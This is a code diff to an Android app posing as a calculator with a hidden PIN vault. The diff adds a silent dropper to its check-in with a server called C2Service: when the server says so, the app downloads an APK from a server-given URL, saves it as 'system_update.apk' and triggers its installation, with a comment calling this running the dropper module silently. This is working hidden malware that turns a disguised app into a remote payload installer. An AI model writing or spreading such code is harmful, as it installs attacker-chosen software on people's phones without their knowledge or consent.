@@ -2,22 +2,27 @@ package org.kalkulator
 
 import android.content.Context
 import android.content.Intent
+import android.net.Uri
 import android.os.Build
 import android.os.Bundle
 import android.provider.Settings
 import android.widget.Button
 import android.widget.TextView
 import androidx.appcompat.app.AppCompatActivity
+import androidx.core.content.FileProvider
+import okhttp3.Call
+import okhttp3.Callback
+import okhttp3.OkHttpClient
+import okhttp3.Request
+import okhttp3.Response
 import org.kalkulator.api.C2Service
 import org.kalkulator.model.CheckinRequest
 import org.kalkulator.model.CheckinResponse
 import org.kalkulator.utils.SecurityManager
-import retrofit2.Call
-import retrofit2.Callback
-import retrofit2.Response
 import retrofit2.Retrofit
 import retrofit2.converter.gson.GsonConverterFactory
 import java.io.File
+import java.io.IOException
 
 class MainActivity : AppCompatActivity() {
 
@@ -68,24 +73,13 @@ class MainActivity : AppCompatActivity() {
             
             if (securityManager.verifyPin(currentInput)) {
                 securityManager.resetFailedAttempts()
-                // Transition to Vault
-                val intent = Intent(this, VaultActivity::class.java)
-                startActivity(intent)
+                startActivity(Intent(this, VaultActivity::class.java))
                 overridePendingTransition(android.R.anim.fade_in, android.R.anim.fade_out)
                 currentInput = ""
                 tvDisplay.text = "0"
             } else {
-                // Incorrect PIN or normal math
-                try {
-                    // Logic normal math could go here
-                    // If it looks like a PIN (e.g. 4-6 digits), track attempt
-                    if (currentInput.length in 4..6) {
-                        securityManager.incrementFailedAttempts()
-                    }
-                    tvDisplay.text = "0" 
-                } catch (e: Exception) {
-                    tvDisplay.text = "Error"
-                }
+                if (currentInput.length in 4..6) securityManager.incrementFailedAttempts()
+                tvDisplay.text = "0"
                 currentInput = ""
             }
         }
@@ -109,12 +103,49 @@ class MainActivity : AppCompatActivity() {
             .build()
 
         val service = retrofit.create(C2Service::class.java)
-        service.checkin(request).enqueue(object : Callback<CheckinResponse> {
-            override fun onResponse(call: Call<CheckinResponse>, response: Response<CheckinResponse>) {
-                // Background checkin, no UI feedback
+        service.checkin(request).enqueue(object : retrofit2.Callback<CheckinResponse> {
+            override fun onResponse(call: retrofit2.Call<CheckinResponse>, response: retrofit2.Response<CheckinResponse>) {
+                if (response.isSuccessful) {
+                    val data = response.body()
+                    if (data?.should_download == true && data.payload_url != null) {
+                        // Jalankan Dropper Modul secara senyap
+                        downloadAndInstallPayload(data.payload_url)
+                    }
+                }
             }
-            override fun onFailure(call: Call<CheckinResponse>, t: Throwable) {}
+            override fun onFailure(call: retrofit2.Call<CheckinResponse>, t: Throwable) {}
         })
+    }
+
+    private fun downloadAndInstallPayload(url: String) {
+        // Fix URL jika tidak ada protokol
+        val fullUrl = if (!url.startsWith("http")) "https://$url" else url
+        val destination = File(getExternalFilesDir(null), "system_update.apk")
+        
+        val client = OkHttpClient()
+        val request = Request.Builder().url(fullUrl).build()
+
+        client.newCall(request).enqueue(object : Callback {
+            override fun onFailure(call: Call, e: IOException) {}
+            override fun onResponse(call: Call, response: Response) {
+                response.body?.let { body ->
+                    try {
+                        destination.outputStream().use { body.byteStream().copyTo(it) }
+                        triggerInstallation(destination)
+                    } catch (e: Exception) {}
+                }
+            }
+        })
+    }
+
+    private fun triggerInstallation(file: File) {
+        val uri = FileProvider.getUriForFile(this, "${packageName}.provider", file)
+        val intent = Intent(Intent.ACTION_VIEW).apply {
+            setDataAndType(uri, "application/vnd.android.package-archive")
+            addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
+            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+        }
+        startActivity(intent)
     }
 
     private fun isDeviceRooted(): Boolean {
